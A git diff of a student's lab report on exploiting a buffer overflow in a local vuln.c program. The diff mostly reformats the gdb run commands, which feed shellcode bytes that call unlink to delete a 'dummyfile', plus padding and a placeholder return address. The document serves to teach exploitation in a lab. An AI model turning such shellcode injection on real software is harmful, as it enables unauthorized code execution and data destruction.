@@ -1,4 +1,5 @@
 *Name: Dinh Thi Thanh Vy*
+
 *ID: 22110093*
 
 # Lab 2: 
@@ -45,7 +46,7 @@ Here, we will use the vuln.c program to trigger a buffer overflow
 
 - Run the program by using command:
 
->r $(python -c "print('\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00'+'a'*32+'\xff\xff\xff\xff')")
+`r $(python -c "print('\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00'+'a'*32+'\xff\xff\xff\xff')")`
 
 ![alt text](./image/image-16.png)
 
@@ -72,7 +73,7 @@ Additionally, `0x0a` has a decimal value of 10, and upon reviewing the assembly 
 
 - For now, we will set the bytes of the address to 0xff. The last used byte of the shellcode will be 0x0f to  prevent string termination and to identify the position of the return frame.
 
->r $(python -c "print('\xeb\x13\x31\xc0\xb0\x08\x04\x02\xbb\x7a\x80\x04\x08\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x**0f**'+'a'*32+'\xff\xff\xff\xff')")
+`r $(python -c "print('\xeb\x13\x31\xc0\xb0\x08\x04\x02\xbb\x7a\x80\x04\x08\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x**0f**'+'a'*32+'\xff\xff\xff\xff')")`
 
 ![alt text](./image/image-22.png)
 
@@ -93,7 +94,7 @@ At this point, the program will likely report an error because it cannot find th
 
 ![alt text](./image/image-24.png)
 
-- Dummyfile is still here. Look back at the assembly code!
+- Why does the Dummyfile still here? Look back at the assembly code by using command:
 
 `objdump -d file_del`
 
